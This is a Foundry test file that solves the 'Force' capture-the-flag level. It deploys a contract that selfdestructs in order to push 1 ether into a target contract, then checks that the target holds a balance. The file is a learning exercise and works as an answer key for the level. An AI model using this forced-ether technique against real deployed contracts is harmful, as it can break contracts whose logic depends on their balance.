// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/07_Force.sol";

contract SelfDestructAttack{
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceTest is Test {
    Force _force;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        vm.deal(attacker, 1 ether); // Fund the attacker

        _force = new Force();

    }

    function testSolution() public {
        vm.startPrank(attacker);

        new SelfDestructAttack{value:1 ether}(payable(address(_force)));

        assertTrue(address(_force).balance > 0, "Force instance does not have any balance!");
    }
}
